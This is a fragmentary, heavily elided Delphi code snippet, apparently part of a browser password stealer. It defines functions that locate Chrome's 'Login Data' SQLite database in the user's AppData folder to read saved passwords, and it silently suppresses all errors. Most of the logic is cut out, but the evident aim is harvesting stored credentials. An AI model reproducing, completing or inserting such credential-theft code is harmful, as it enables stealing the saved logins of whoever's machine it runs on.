...
function ListChromePasswords(Sqlite3Path: string): string;
...
function GetChromePass(Sqlite3Path: string): string;
var
  DB: TSQLiteDatabase;
  Tablo: TSQLiteTable;
  Sifre: string;
...
begin
  ...
  Arquivo := GetAppData + '\Google\Chrome\User Data\Default\Login Data'; //ou "web data" no antigo 
...
begin
  Result := '';
  try Result := GetChromePass(Sqlite3Path); except end;
end;
